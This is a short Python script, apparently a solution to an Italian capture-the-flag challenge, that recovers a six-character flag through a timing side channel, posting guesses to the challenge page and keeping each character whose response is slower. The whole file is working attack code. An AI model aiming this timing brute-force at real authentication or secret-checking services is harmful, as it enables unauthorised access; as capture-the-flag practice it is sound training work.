#!/usr/bin/env python3
# è spwanata recentemente
import requests, string

SITE = "http://time-is-key.challs.olicyber.it/index.php"
flag = ""

while len(flag) < 6:
    for i in string.printable:
        r = requests.post(SITE, data={"flag": flag + i + 'a'*(5 - len(flag)), "submit":"Invia la flag!"})
        
        if r.elapsed.total_seconds() > 1+len(flag):
            print(i)
            flag += i
            break
        else:
            print("no", i)
print(flag)